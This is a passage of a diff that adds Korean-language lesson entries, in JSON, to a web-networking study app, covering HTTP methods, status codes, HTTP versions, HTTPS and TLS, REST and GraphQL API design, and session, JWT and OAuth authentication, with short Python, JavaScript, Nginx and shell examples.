PATCH\nrequests.patch('/users/1', json={\n    'email': 'new@test.com'\n})\n\n# DELETE\nrequests.delete('/users/1')\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 안전성과 멱등성",
+        "content": "### 개념 정리\n\n```\n안전(Safe): 서버 데이터 안 바뀜\n멱등(Idempotent): 여러 번 해도 결과 같음\n\nGET: 안전 O, 멱등 O\nPOST: 안전 X, 멱등 X (호출할 때마다 새로 생성)\nPUT: 안전 X, 멱등 O (덮어쓰기)\nPATCH: 안전 X, 멱등 X (상황에 따라 다름)\nDELETE: 안전 X, 멱등 O (이미 삭제돼도 결과 같음)\n```\n\n### PUT vs PATCH\n\n```\nPUT: 전체 교체\n├── 보내지 않은 필드 = 삭제/초기화\n└── 전체 데이터 필요\n\nPATCH: 부분 수정\n├── 보낸 필드만 수정\n└── 변경할 것만 전송\n```"
+      }
+    ]
+  },
+  "03_HTTP/http-status-code": {
+    "id": "03_HTTP/http-status-code",
+    "title": "HTTP 상태 코드",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTP 응답 상태 코드의 의미를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 상태 코드란?",
+        "content": "## 🔥 한 줄 요약\n> **서버 응답의 결과를 숫자로** - \"성공!\", \"못 찾음!\", \"서버 에러!\"\n\n---\n\n## 🎯 상태 코드 분류\n\n```\n1xx: 정보 (거의 안 씀)\n2xx: 성공 ✅\n3xx: 리다이렉션 ↪️\n4xx: 클라이언트 에러 ❌ (너 잘못)\n5xx: 서버 에러 💥 (내 잘못)\n```\n\n---\n\n## 🎯 자주 쓰는 코드\n\n### 2xx 성공\n\n```\n200 OK\n└── 성공! (가장 흔함)\n\n201 Created\n└── 생성 성공! (POST 후)\n\n204 No Content\n└── 성공인데 보낼 데이터 없음 (DELETE 후)\n```\n\n### 3xx 리다이렉션\n\n```\n301 Moved Permanently\n└── 영구 이동 (북마크 변경됨)\n\n302 Found\n└── 임시 이동\n\n304 Not Modified\n└── 캐시 사용해 (변경 없음)\n```\n\n### 4xx 클라이언트 에러\n\n```\n400 Bad Request\n└── 잘못된 요청 (파라미터 오류)\n\n401 Unauthorized\n└── 인증 필요 (로그인 해!)\n\n403 Forbidden\n└── 권한 없음 (로그인 했지만 접근 불가)\n\n404 Not Found\n└── 못 찾음 (URL 오류)\n\n409 Conflict\n└── 충돌 (이미 존재)\n\n429 Too Many Requests\n└── 요청 너무 많음 (rate limit)\n```\n\n### 5xx 서버 에러\n\n```\n500 Internal Server Error\n└── 서버 에러 (코드 버그!)\n\n502 Bad Gateway\n└── 게이트웨이 에러 (프록시 문제)\n\n503 Service Unavailable\n└── 서버 과부하/점검 중\n\n504 Gateway Timeout\n└── 타임아웃\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 상태 코드 처리",
+        "content": "### 프론트엔드에서 처리\n\n```javascript\ntry {\n    const response = await fetch('/api/users');\n\n    if (response.ok) {  // 200-299\n        const data = await response.json();\n    } else if (response.status === 401) {\n        // 로그인 페이지로\n        window.location.href = '/login';\n    } else if (response.status === 404) {\n        alert('데이터를 찾을 수 없습니다');\n    } else if (response.status >= 500) {\n        alert('서버 에러가 발생했습니다');\n    }\n} catch (error) {\n    alert('네트워크 에러');\n}\n```\n\n### 백엔드에서 반환\n\n```python\nfrom flask import Flask, jsonify\n\napp = Flask(__name__)\n\n@app.route('/users/<int:id>')\ndef get_user(id):\n    user = find_user(id)\n\n    if not user:\n        return jsonify({'error': 'User not found'}), 404\n\n    return jsonify(user), 200\n\n@app.route('/users', methods=['POST'])\ndef create_user():\n    # 유효성 검사 실패\n    if not valid:\n        return jsonify({'error': 'Invalid data'}), 400\n\n    user = create(data)\n    return jsonify(user), 201  # Created\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 실무 팁",
+        "content": "### 자주 실수하는 것\n\n```\n❌ 모든 에러에 500 반환\n✅ 상황에 맞는 코드 사용\n\n❌ 에러인데 200 반환\n✅ 실패하면 4xx/5xx\n\n❌ 401과 403 혼동\n401: 인증 안 됨 (로그인 필요)\n403: 인증 됐지만 권한 없음\n```\n\n### API 설계 시\n\n```\nGET 성공: 200 + 데이터\nPOST 성공: 201 + 생성된 데이터\nPUT/PATCH 성공: 200 + 수정된 데이터\nDELETE 성공: 204 (No Content)\n```"
+      }
+    ]
+  },
+  "03_HTTP/http-version": {
+    "id": "03_HTTP/http-version",
+    "title": "HTTP 버전",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTP/1.1, HTTP/2, HTTP/3의 차이를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 HTTP 버전 비교",
+        "content": "## 🎯 버전 역사\n\n```\nHTTP/0.9 (1991): HTML만 전송\nHTTP/1.0 (1996): 헤더, 상태코드 추가\nHTTP/1.1 (1997): 지속 연결 (현재 대부분)\nHTTP/2 (2015): 멀티플렉싱, 헤더 압축\nHTTP/3 (2022): UDP 기반 (QUIC)\n```\n\n---\n\n## 🎯 버전별 특징\n\n### HTTP/1.1\n\n```\n한 번에 하나씩:\n요청1 → 응답1 → 요청2 → 응답2\n\n문제:\n├── 순서대로 처리 (Head-of-line blocking)\n├── 매 요청마다 헤더 반복\n└── 연결 여러 개로 해결 (최대 6개)\n```\n\n### HTTP/2\n\n```\n동시에 여러 개:\n요청1, 요청2, 요청3 → 응답들이 뒤섞여 도착\n\n장점:\n├── 멀티플렉싱 (하나의 연결로 동시 요청)\n├── 헤더 압축 (HPACK)\n├── 서버 푸시 (요청 전에 미리 전송)\n└── 바이너리 프레임\n```\n\n### HTTP/3\n\n```\nQUIC 프로토콜 (UDP 기반):\n\n장점:\n├── 연결 설정 빠름 (0-RTT)\n├── 패킷 손실에 강함\n├── 모바일 환경 최적화\n└── 내장 암호화 (TLS 1.3)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 버전 확인",
+        "content": "### 브라우저에서 확인\n\n```\nChrome 개발자 도구 (F12)\n└── Network 탭\n    └── Protocol 열 확인\n        ├── h2 = HTTP/2\n        ├── h3 = HTTP/3\n        └── http/1.1 = HTTP/1.1\n```\n\n### curl로 확인\n\n```bash\n# HTTP 버전 지정\ncurl --http1.1 https://example.com\ncurl --http2 https://example.com\ncurl --http3 https://example.com\n\n# 사용된 프로토콜 확인\ncurl -I -s https://google.com | grep -i 'http/'\n```\n\n### 서버에서 HTTP/2 활성화\n\n```nginx\n# Nginx\nserver {\n    listen 443 ssl http2;\n    # ...\n}\n```\n\n```python\n# Python (hypercorn)\n# hypercorn --bind 0.0.0.0:443 app:app\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 선택 가이드",
+        "content": "### 언제 어떤 버전?\n\n```\nHTTP/1.1:\n├── 레거시 시스템\n├── 간단한 API\n\nHTTP/2:\n├── 대부분의 웹사이트 (권장)\n├── 많은 리소스 로딩\n\nHTTP/3:\n├── 모바일 앱\n├── 불안정한 네트워크\n├── 실시간 스트리밍\n```\n\n### 현재 지원 현황\n\n```\n대부분의 브라우저: HTTP/2 기본\n최신 브라우저: HTTP/3 지원\n서버: Nginx, Cloudflare 등 지원\n```"
+      }
+    ]
+  },
+  "03_HTTP/https": {
+    "id": "03_HTTP/https",
+    "title": "HTTPS",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTPS의 원리와 중요성을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 HTTPS란?",
+        "content": "## 🔥 한 줄 요약\n> **HTTP + 암호화** - 도청 방지 보안 통신!\n\n---\n\n## 💡 왜 필요한가?\n\n### HTTP의 문제\n\n```\n📱 카페 와이파이에서 HTTP 사용 시:\n\n나 ──────────── 해커 ──────────── 서버\n      \"비밀번호: 1234\"\n           ↓\n      해커: \"야호! 비밀번호 1234!\"\n\n→ 중간에서 훔쳐볼 수 있음 (스니핑)\n→ 내용 변조 가능\n```\n\n### HTTPS 사용 시\n\n```\n나 ────🔒──── 해커 ────🔒──── 서버\n   \"Xk3#@!9z...\"\n        ↓\n   해커: \"뭔 소리야?\"\n\n→ 암호화되어 해독 불가\n→ 변조 감지 가능\n```\n\n---\n\n## 🎯 HTTPS가 제공하는 것\n\n```\n1. 기밀성 (Confidentiality)\n   └── 내용 암호화 (도청 방지)\n\n2. 무결성 (Integrity)\n   └── 변조 감지 (중간에 수정 불가)\n\n3. 인증 (Authentication)\n   └── 서버 신원 확인 (피싱 방지)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 HTTPS 적용",
+        "content": "### 인증서 발급 (Let's Encrypt 무료)\n\n```bash\n# certbot 설치 (Ubuntu)\nsudo apt install certbot python3-certbot-nginx\n\n# 인증서 발급 + Nginx 자동 설정\nsudo certbot --nginx -d example.com -d www.example.com\n\n# 인증서 갱신 (자동)\nsudo certbot renew --dry-run\n```\n\n### Nginx HTTPS 설정\n\n```nginx\nserver {\n    listen 443 ssl;\n    server_name example.com;\n\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n\n    # 보안 설정\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_prefer_server_ciphers on;\n}\n\n# HTTP → HTTPS 리다이렉트\nserver {\n    listen 80;\n    server_name example.com;\n    return 301 https://$server_name$request_uri;\n}\n```\n\n### 브라우저에서 확인\n\n```\n🔒 자물쇠 아이콘 클릭\n└── 인증서 정보 확인\n    ├── 발급 대상\n    ├── 발급 기관\n    └── 유효 기간\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 실무 팁",
+        "content": "### 필수 적용\n\n```\n✅ HTTPS 필수인 경우\n├── 로그인/회원가입\n├── 결제\n├── 개인정보 입력\n├── PWA\n└── HTTP/2 (HTTPS 필수)\n\n실제로: 모든 사이트에 HTTPS 권장\nChrome: HTTP 사이트에 \"안전하지 않음\" 표시\n```\n\n### 주의사항\n\n```\nMixed Content:\n├── HTTPS 페이지에서 HTTP 리소스 로드\n├── 브라우저가 차단!\n└── 모든 리소스 HTTPS로\n\n인증서 갱신:\n├── Let's Encrypt: 90일\n├── 자동 갱신 설정 필수\n└── 만료되면 사이트 접속 불가\n```"
+      }
+    ]
+  },
+  "03_HTTP/tls-handshake": {
+    "id": "03_HTTP/tls-handshake",
+    "title": "TLS Handshake",
+    "category": "network",
+    "subCategory": "03_HTTP",
+    "language": "JavaScript",
+    "description": "HTTPS 연결의 TLS 핸드셰이크를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 TLS Handshake란?",
+        "content": "## 🔥 한 줄 요약\n> **HTTPS 연결 전 암호화 협상** - \"어떤 암호 쓸까?\"\n\n---\n\n## 🎯 TLS 1.2 Handshake\n\n```\n클라이언트                     서버\n    │                           │\n    │─── ClientHello ──────────▶│\n    │   \"나 TLS 쓸 수 있어,     │\n    │    이런 암호들 가능해\"      │\n    │                           │\n    │◀── ServerHello ───────────│\n    │   \"이 암호 쓰자,          │\n    │    내 인증서야\"            │\n    │                           │\n    │◀── Certificate ───────────│\n    │   (서버 인증서)            │\n    │                           │\n    │─── 키 교환 ──────────────▶│\n    │   (비밀키 생성 재료)        │\n    │                           │\n    │◀── Finished ──────────────│\n    │                           │\n    │─── Finished ─────────────▶│\n    │                           │\n    │◀═══ 암호화 통신 시작 ═════▶│\n```\n\n---\n\n## 🎯 TLS 1.3 (더 빠름!)\n\n```\n1-RTT Handshake:\n\n클라이언트 → 서버: ClientHello + 키 공유\n서버 → 클라이언트: ServerHello + 키 공유 + 인증서\n\n끝! 바로 암호화 통신 시작\n\n→ TLS 1.2보다 1 왕복 절약\n→ 더 빠른 연결\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 TLS 확인",
+        "content": "### OpenSSL로 확인\n\n```bash\n# TLS 연결 테스트\nopenssl s_client -connect google.com:443\n\n# 출력:\n# Protocol  : TLSv1.3\n# Cipher    : TLS_AES_256_GCM_SHA384\n# Certificate chain\n#  0 s:CN = www.google.com\n#    i:C = US, O = Google Trust Services\n```\n\n### 인증서 정보 확인\n\n```bash\n# 인증서 상세 정보\nopenssl s_client -connect google.com:443 | openssl x509 -text\n\n# 만료일만 확인\necho | openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -noout -dates\n```\n\n### curl로 TLS 버전 확인\n\n```bash\ncurl -v https://google.com 2>&1 | grep \"SSL connection\"\n# SSL connection using TLSv1.3\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 보안 설정",
+        "content": "### 권장 TLS 설정\n\n```\n✅ 사용\n├── TLS 1.3 (최신)\n├── TLS 1.2 (호환성)\n\n❌ 사용 금지\n├── TLS 1.1 이하\n├── SSL 3.0\n└── 취약한 암호 스위트\n```\n\n### HSTS (HTTP Strict Transport Security)\n\n```\n브라우저에게 \"항상 HTTPS로 접속해\" 지시\n\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n→ 1년간 HTTPS만 사용\n→ HTTP로 접속 시도 시 자동으로 HTTPS로 변환\n```"
+      }
+    ]
+  },
+  "04_REST/rest-concept": {
+    "id": "04_REST/rest-concept",
+    "title": "REST 개념",
+    "category": "network",
+    "subCategory": "04_REST",
+    "language": "JavaScript",
+    "description": "REST 아키텍처의 원칙을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 REST란?",
+        "content": "## 🔥 한 줄 요약\n> **URL로 자원을 나타내고, HTTP 메서드로 행위를 표현** - API 설계 규칙!\n\n---\n\n## 💡 왜 배워야 하나?\n\n```\n🌐 현대 웹 API의 90% = REST\n\n프론트엔드: \"유저 정보 어떻게 받아요?\"\n백엔드: \"GET /users/1 호출하세요\"\n\n→ REST를 알면 API가 직관적!\n```\n\n---\n\n## 🎯 REST 원칙\n\n### 1. 자원(Resource) 중심\n\n```\n모든 것은 자원(명사)!\n\n❌ /getUsers        (동사)\n❌ /createUser      (동사)\n✅ /users           (명사, 복수형)\n✅ /users/1         (특정 자원)\n```\n\n### 2. HTTP 메서드로 행위 표현\n\n```\n자원 + 메서드 = 행위\n\nGET    /users     = 유저 목록 조회\nGET    /users/1   = 유저 1번 조회\nPOST   /users     = 유저 생성\nPUT    /users/1   = 유저 1번 수정\nDELETE /users/1   = 유저 1번 삭제\n```\n\n### 3. 무상태(Stateless)\n\n```\n서버가 클라이언트 상태 저장 X\n모든 요청은 독립적\n\n→ 매 요청에 필요한 정보 모두 포함\n→ 토큰으로 인증\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 REST API 예시",
+        "content": "### 게시판 API 설계\n\n```\n# 게시글 목록\nGET /posts\n\n# 게시글 상세\nGET /posts/1\n\n# 게시글 작성\nPOST /posts\nBody: {\"title\": \"제목\", \"content\": \"내용\"}\n\n# 게시글 수정\nPUT /posts/1\nBody: {\"title\": \"새 제목\", \"content\": \"새 내용\"}\n\n# 게시글 삭제\nDELETE /posts/1\n\n# 게시글의 댓글 목록\nGET /posts/1/comments\n\n# 댓글 작성\nPOST /posts/1/comments\nBody: {\"content\": \"댓글 내용\"}\n```\n\n### 쿼리 파라미터 활용\n\n```\n# 페이지네이션\nGET /posts?page=1&limit=10\n\n# 정렬\nGET /posts?sort=created_at&order=desc\n\n# 필터링\nGET /posts?category=tech&author=kim\n\n# 검색\nGET /posts?q=키워드\n```\n\n### 응답 예시\n\n```json\n// GET /posts/1\n{\n    \"id\": 1,\n    \"title\": \"REST API란?\",\n    \"content\": \"...\",\n    \"author\": {\n        \"id\": 100,\n        \"name\": \"김철수\"\n    },\n    \"created_at\": \"2024-01-15T10:30:00Z\",\n    \"_links\": {\n        \"self\": \"/posts/1\",\n        \"comments\": \"/posts/1/comments\"\n    }\n}\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 REST 팁",
+        "content": "### URL 설계 규칙\n\n```\n✅ 좋은 예\n/users\n/users/123\n/users/123/orders\n/products?category=electronics\n\n❌ 나쁜 예\n/getUsers\n/user_list\n/users/123/get\n/UsersOrders\n```\n\n### 상태 코드 활용\n\n```\n200: 조회 성공\n201: 생성 성공\n204: 삭제 성공 (No Content)\n400: 잘못된 요청\n401: 인증 필요\n403: 권한 없음\n404: 자원 없음\n500: 서버 에러\n```"
+      }
+    ]
+  },
+  "04_REST/rest-design": {
+    "id": "04_REST/rest-design",
+    "title": "REST API 설계",
+    "category": "network",
+    "subCategory": "04_REST",
+    "language": "JavaScript",
+    "description": "실무 REST API 설계 방법을 학습합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 API 설계 패턴",
+        "content": "## 🎯 URL 설계\n\n### 계층 구조\n\n```\n/users                    # 유저 목록\n/users/{id}               # 특정 유저\n/users/{id}/orders        # 유저의 주문 목록\n/users/{id}/orders/{id}   # 특정 주문\n```\n\n### 쿼리 파라미터\n\n```\n페이지네이션:\n?page=1&per_page=20\n?offset=0&limit=20\n?cursor=abc123 (커서 기반)\n\n필터링:\n?status=active\n?created_after=2024-01-01\n\n정렬:\n?sort=created_at\n?sort=-created_at (역순, - 접두사)\n?sort=name,asc\n```\n\n---\n\n## 🎯 응답 설계\n\n### 단일 자원\n\n```json\n{\n    \"id\": 1,\n    \"name\": \"김철수\",\n    \"email\": \"kim@test.com\",\n    \"created_at\": \"2024-01-15T10:00:00Z\"\n}\n```\n\n### 목록 (페이지네이션)\n\n```json\n{\n    \"data\": [\n        {\"id\": 1, \"name\": \"김철수\"},\n        {\"id\": 2, \"name\": \"이영희\"}\n    ],\n    \"pagination\": {\n        \"page\": 1,\n        \"per_page\": 20,\n        \"total\": 100,\n        \"total_pages\": 5\n    }\n}\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 설계 예시",
+        "content": "### 쇼핑몰 API 설계\n\n```\n# 상품\nGET    /products              # 상품 목록\nGET    /products/:id          # 상품 상세\nPOST   /products              # 상품 등록 (관리자)\nPUT    /products/:id          # 상품 수정\nDELETE /products/:id          # 상품 삭제\n\n# 장바구니\nGET    /cart                  # 내 장바구니\nPOST   /cart/items            # 장바구니 추가\nPATCH  /cart/items/:id        # 수량 변경\nDELETE /cart/items/:id        # 항목 삭제\n\n# 주문\nGET    /orders                # 내 주문 목록\nGET    /orders/:id            # 주문 상세\nPOST   /orders                # 주문 생성\nPATCH  /orders/:id/cancel     # 주문 취소\n\n# 리뷰\nGET    /products/:id/reviews  # 상품 리뷰 목록\nPOST   /products/:id/reviews  # 리뷰 작성\n```\n\n### 복잡한 검색\n\n```\n# 방법 1: GET + 쿼리 파라미터\nGET /products?category=electronics&min_price=100&max_price=500\n\n# 방법 2: POST + Body (복잡한 검색)\nPOST /products/search\n{\n    \"filters\": {\n        \"category\": [\"electronics\", \"fashion\"],\n        \"price\": {\"min\": 100, \"max\": 500},\n        \"rating\": {\"gte\": 4}\n    },\n    \"sort\": {\"field\": \"price\", \"order\": \"asc\"}\n}\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 설계 원칙",
+        "content": "### 일관성 유지\n\n```\n✅ 모든 API에서 동일한 패턴\n\n응답 형식 통일\n에러 형식 통일\n인증 방식 통일\n네이밍 컨벤션 통일\n```\n\n### 문서화\n\n```\nSwagger/OpenAPI로 문서 자동 생성\n→ 프론트엔드 개발자가 쉽게 이해\n→ API 테스트도 가능\n```"
+      }
+    ]
+  },
+  "04_REST/rest-vs-graphql": {
+    "id": "04_REST/rest-vs-graphql",
+    "title": "REST vs GraphQL",
+    "category": "network",
+    "subCategory": "04_REST",
+    "language": "JavaScript",
+    "description": "REST와 GraphQL의 차이점을 비교합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 REST vs GraphQL",
+        "content": "## 🎯 비교\n\n### REST\n```\n여러 엔드포인트, 고정된 응답\n\nGET /users/1\nGET /users/1/posts\nGET /users/1/followers\n\n→ 3번의 요청\n→ 불필요한 데이터도 받음 (Over-fetching)\n→ 필요한 데이터 부족할 수 있음 (Under-fetching)\n```\n\n### GraphQL\n```\n하나의 엔드포인트, 원하는 데이터만\n\nPOST /graphql\n{\n    user(id: 1) {\n        name\n        posts { title }\n        followers { name }\n    }\n}\n\n→ 1번의 요청\n→ 필요한 것만 정확히 받음\n```\n\n---\n\n## 🎯 언제 뭘 쓸까?\n\n```\nREST:\n├── 간단한 CRUD\n├── 캐싱 중요\n├── 파일 업로드\n└── 팀이 익숙함\n\nGraphQL:\n├── 복잡한 관계 데이터\n├── 모바일 앱 (대역폭 절약)\n├── 프론트엔드 주도 개발\n└── 빠른 프로토타이핑\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 비교 예시",
+        "content": "### 같은 기능, 다른 방식\n\n```\n# REST: 유저 + 게시글 + 팔로워 조회\n\nGET /users/1\nGET /users/1/posts\nGET /users/1/followers\n\n# 응답 3개, 불필요한 필드 포함\n```\n\n```graphql\n# GraphQL: 한 번에\n\nquery {\n    user(id: 1) {\n        name\n        email\n        posts(limit: 5) {\n            title\n            createdAt\n        }\n        followers {\n            name\n        }\n    }\n}\n\n# 응답 1개, 필요한 필드만\n```\n\n### Python GraphQL (Strawberry)\n\n```python\nimport strawberry\nfrom fastapi import FastAPI\nfrom strawberry.asgi import GraphQL\n\n@strawberry.type\nclass User:\n    id: int\n    name: str\n    email: str\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def user(self, id: int) -> User:\n        return get_user(id)\n\nschema = strawberry.Schema(query=Query)\napp = FastAPI()\napp.add_route(\"/graphql\", GraphQL(schema))\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 선택 가이드",
+        "content": "### 결정 기준\n\n```\n데이터 구조 복잡? → GraphQL\n캐싱 중요? → REST\n팀 경험? → 익숙한 것\n마이크로서비스? → REST (API Gateway)\n```\n\n### 하이브리드 접근\n\n```\n많은 회사들:\n├── 외부 API: REST\n├── 내부 BFF: GraphQL\n└── 상황에 맞게 선택\n```"
+      }
+    ]
+  },
+  "04_REST/restful-api": {
+    "id": "04_REST/restful-api",
+    "title": "RESTful API",
+    "category": "network",
+    "subCategory": "04_REST",
+    "language": "JavaScript",
+    "description": "RESTful API 설계 원칙을 학습합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔥 RESTful이란?",
+        "content": "## 🔥 한 줄 요약\n> **REST 원칙을 잘 지킨 API** - \"제대로 된 REST\"\n\n---\n\n## 🎯 RESTful 체크리스트\n\n```\n✅ URL은 자원(명사) 표현\n✅ 행위는 HTTP 메서드로\n✅ 복수형 명사 사용 (/users)\n✅ 계층 구조 표현 (/users/1/posts)\n✅ 적절한 상태 코드 반환\n✅ 버전 관리 (/v1/users)\n```\n\n---\n\n## 🎯 안티패턴 vs 좋은 예\n\n```\n❌ GET /getUser?id=1\n✅ GET /users/1\n\n❌ POST /users/delete/1\n✅ DELETE /users/1\n\n❌ GET /users/1/posts/create\n✅ POST /users/1/posts\n\n❌ POST /search/users\n✅ GET /users?q=keyword\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 RESTful API 구현",
+        "content": "### Flask로 구현\n\n```python\nfrom flask import Flask, jsonify, request\n\napp = Flask(__name__)\nusers = {}\n\n# GET /users - 목록 조회\n@app.route('/users', methods=['GET'])\ndef get_users():\n    return jsonify(list(users.values())), 200\n\n# GET /users/:id - 상세 조회\n@app.route('/users/<int:id>', methods=['GET'])\ndef get_user(id):\n    if id not in users:\n        return jsonify({'error': 'Not found'}), 404\n    return jsonify(users[id]), 200\n\n# POST /users - 생성\n@app.route('/users', methods=['POST'])\ndef create_user():\n    data = request.json\n    id = len(users) + 1\n    users[id] = {'id': id, **data}\n    return jsonify(users[id]), 201\n\n# PUT /users/:id - 수정\n@app.route('/users/<int:id>', methods=['PUT'])\ndef update_user(id):\n    if id not in users:\n        return jsonify({'error': 'Not found'}), 404\n    users[id].update(request.json)\n    return jsonify(users[id]), 200\n\n# DELETE /users/:id - 삭제\n@app.route('/users/<int:id>', methods=['DELETE'])\ndef delete_user(id):\n    if id not in users:\n        return jsonify({'error': 'Not found'}), 404\n    del users[id]\n    return '', 204\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 실무 팁",
+        "content": "### API 버전 관리\n\n```\n방법 1: URL에 버전\n/v1/users\n/v2/users\n\n방법 2: 헤더에 버전\nAccept: application/vnd.api+json;version=1\n\n→ URL 방식이 직관적 (많이 사용)\n```\n\n### 에러 응답 형식\n\n```json\n{\n    \"error\": {\n        \"code\": \"USER_NOT_FOUND\",\n        \"message\": \"유저를 찾을 수 없습니다\",\n        \"details\": {\n            \"user_id\": 123\n        }\n    }\n}\n```"
+      }
+    ]
+  },
+  "05_인증/auth-compare": {
+    "id": "05_인증/auth-compare",
+    "title": "인증 방식 비교",
+    "category": "network",
+    "subCategory": "05_인증",
+    "language": "Python",
+    "description": "다양한 인증 방식을 비교 분석합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔐 인증 방식 총정리",
+        "content": "## 🔐 한 줄 요약\n> **쿠키/세션, JWT, OAuth** - 상황에 맞는 인증 방식을 선택하세요!\n\n---\n\n## 🎯 한눈에 비교\n\n```\n┌────────────┬─────────────┬─────────────┬─────────────┐\n│            │ 세션+쿠키    │    JWT      │   OAuth     │\n├────────────┼─────────────┼─────────────┼─────────────┤\n│ 저장 위치   │ 서버        │ 클라이언트   │ 외부 서비스  │\n│ 확장성     │ 낮음        │ 높음        │ 높음        │\n│ 보안      │ 좋음        │ 보통        │ 좋음        │\n│ 무효화    │ 쉬움        │ 어려움       │ 외부 의존    │\n│ 복잡도    │ 낮음        │ 중간        │ 높음        │\n└────────────┴─────────────┴─────────────┴─────────────┘\n```\n\n### 방식별 특징\n\n```\n🍪 세션 + 쿠키\n├── 서버가 상태 관리\n├── 즉시 로그아웃 가능\n├── 서버 메모리/저장소 필요\n└── 단일 서버에 적합\n\n🎟️ JWT\n├── 클라이언트가 토큰 보관\n├── 서버 조회 불필요\n├── 토큰 탈취 시 만료까지 유효\n└── 마이크로서비스에 적합\n\n🔐 OAuth\n├── 외부 서비스로 인증 위임\n├── 비밀번호 관리 불필요\n├── 소셜 로그인 구현\n└── 외부 서비스 의존\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 상황별 선택 가이드",
+        "content": "### 1. 단순 웹 서비스 → 세션\n\n```javascript\n// 전통적인 세션 기반 인증\n// 장점: 단순, 안전, 즉시 로그아웃\n\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'keyboard cat',\n  resave: false,\n  saveUninitialized: false,\n  cookie: { secure: true, httpOnly: true }\n}));\n\n// 로그인\napp.post('/login', (req, res) => {\n  req.session.userId = user.id;\n});\n\n// 로그아웃 - 즉시 무효화!\napp.post('/logout', (req, res) => {\n  req.session.destroy();\n});\n```\n\n### 2. API 서버 / 모바일 → JWT\n\n```javascript\n// JWT 기반 인증\n// 장점: Stateless, 확장성, 다양한 클라이언트\n\nconst jwt = require('jsonwebtoken');\n\n// Access + Refresh 토큰 발급\napp.post('/login', (req, res) => {\n  const accessToken = jwt.sign(\n    { userId: user.id },\n    ACCESS_SECRET,\n    { expiresIn: '15m' }\n  );\n\n  const refreshToken = jwt.sign(\n    { userId: user.id },\n    REFRESH_SECRET,\n    { expiresIn: '7d' }\n  );\n\n  // Refresh Token은 HttpOnly 쿠키로\n  res.cookie('refreshToken', refreshToken, {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict'\n  });\n\n  res.json({ accessToken });\n});\n\n// 토큰 갱신\napp.post('/refresh', (req, res) => {\n  const { refreshToken } = req.cookies;\n  const payload = jwt.verify(refreshToken, REFRESH_SECRET);\n  const newAccessToken = jwt.sign(\n    { userId: payload.userId },\n    ACCESS_SECRET,\n    { expiresIn: '15m' }\n  );\n  res.json({ accessToken: newAccessToken });\n});\n```\n\n### 3. 소셜 로그인 → OAuth\n\n```javascript\n// OAuth로 카카오/구글 로그인\n// 장점: 비밀번호 관리 불필요, 사용자 편의\n\n// 1. OAuth 로그인 후 → 내부 JWT 발급\napp.get('/auth/kakao/callback', async (req, res) => {\n  // 카카오에서 사용자 정보 획득\n  const kakaoUser = await getKakaoUser(req.query.code);\n\n  // 내부 사용자 생성/조회\n  const user = await findOrCreateUser(kakaoUser);\n\n  // 내부 JWT 발급 (이후엔 JWT로 인증)\n  const token = jwt.sign({ userId: user.id }, SECRET);\n\n  res.json({ token });\n});\n```\n\n### 하이브리드: 세션 + JWT\n\n```javascript\n// 웹: 세션, API: JWT\n// 하나의 서비스에서 둘 다 지원\n\n// 웹 요청 - 세션 확인\napp.use('/web', (req, res, next) => {\n  if (req.session.userId) {\n    req.user = { id: req.session.userId };\n    return next();\n  }\n  res.redirect('/login');\n});\n\n// API 요청 - JWT 확인\napp.use('/api', (req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token) {\n    req.user = jwt.verify(token, SECRET);\n    return next();\n  }\n  res.status(401).json({ error: 'Unauthorized' });\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 선택 기준",
